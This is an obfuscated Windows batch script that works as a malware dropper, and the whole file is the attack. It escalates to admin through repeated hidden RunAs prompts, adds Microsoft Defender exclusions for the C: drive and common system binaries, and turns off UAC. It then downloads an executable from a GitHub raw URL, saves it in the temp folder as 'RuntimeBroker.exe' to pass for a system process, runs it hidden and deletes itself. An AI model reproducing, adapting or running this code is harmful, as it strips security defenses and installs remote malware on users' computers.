@echo off & setlocal enableDelayedExpansion
set "MLED=SESSION" & set "dKZrU=NET" & set "HNSi=>nul" & set "Jod=2>&1"
%dKZrU% %MLED% %HNSi% %Jod%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "TAY=baz" & set "yzI=foo" & set "qieR=bar" & set "BzWlf=qux" & rem RvowZUz yDldg PuOe
set "qJQ=powershell -ExecutionPolicy Bypass -Command"
set "EJP=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "uIFCc='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "ajGES='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!qJQ! "!EJP! !uIFCc! !ajGES!" %HNSi% %Jod%
set "XPiz=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "kKyDj=-Name 'EnableLUA' -Value 0"
!qJQ! "!XPiz! !kKyDj!" %HNSi% %Jod%
set "DhP=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!qJQ! "!DhP!" %HNSi% %Jod%
if !errorlevel! neq 0 (goto %a%)
set "NUP=timeout /t" & !NUP! 2 %HNSi% %Jod%
set "RwR=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "Ois=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "jJH=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!qJQ! "!RwR! !Ois! !jJH!" %HNSi% %Jod%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!NUP! 1 %HNSi% %Jod% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %HNSi% %Jod%
del /f /q "%~f0" %HNSi% %Jod%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %HNSi% %Jod%
if !errorlevel! neq 0 (!NUP! 3 %HNSi% %Jod% & goto %b%)
exit /b
